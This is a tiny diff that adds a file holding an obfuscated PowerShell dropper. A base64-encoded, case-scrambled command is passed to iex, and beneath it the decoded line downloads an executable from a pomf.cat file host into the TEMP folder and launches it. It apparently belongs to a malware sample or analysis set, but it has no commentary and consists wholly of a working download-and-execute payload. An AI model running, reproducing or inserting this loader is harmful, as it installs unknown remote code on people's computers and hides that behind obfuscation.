@@ -1,0 +1,7 @@
+iex([SYstem.TexT.eNcOdING]::UTF8.GeTSTRInG([sYsTEM.conVert]::FROmBasE64sTriNG('CihOZXctT2JqZWN0IFN5c3RlTS5uRXQud0VCQ2xJRW50KS5kb1dOTE9BREZJbGUoJ2h0dHBzOi8vYS5wb21mLmNhdC94c2FrcG8uZXhlJywiJEVOVjpURU1QXGV1aW9rby5leGUiKTtTdGFydC1Qcm9jZXNzICgiJEVOVjpURU1QXGV1aW9rby5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SysteM.nEt.wEBClIEnt).doWNLOADFIle('https://a.pomf.cat/xsakpo.exe',"$ENV:TEMP\euioko.exe");Start-Process ("$ENV:TEMP\euioko.exe")
+
